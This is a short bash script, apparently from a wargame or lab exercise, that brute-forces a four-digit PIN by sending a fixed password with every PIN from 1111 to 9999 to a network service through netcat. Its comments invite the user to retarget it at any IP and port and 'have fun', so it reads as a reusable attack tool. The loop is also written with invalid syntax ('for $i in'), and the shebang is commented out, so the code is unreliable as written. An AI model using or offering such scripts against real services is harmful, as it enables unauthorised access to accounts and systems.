#Setup the SheBang structure;  
#!/bin/bash  
  
#Create a Variable for storing password;  
#Change the password to the targets password  
passwordforuser=abc123  
  
  
#Create the for loop function;  
for $i in {1111..9999}; do
	echo "$passwordforuser $i"
done | nc localhost 1234

#Change the numbers {1111..9999} to your set of pins you need to use.  
#Change the (localhost 1234) to the target url/ip & port number to the one you need to use.  
#Execute command like so (./pinbruteforcing.sh) And have fun!
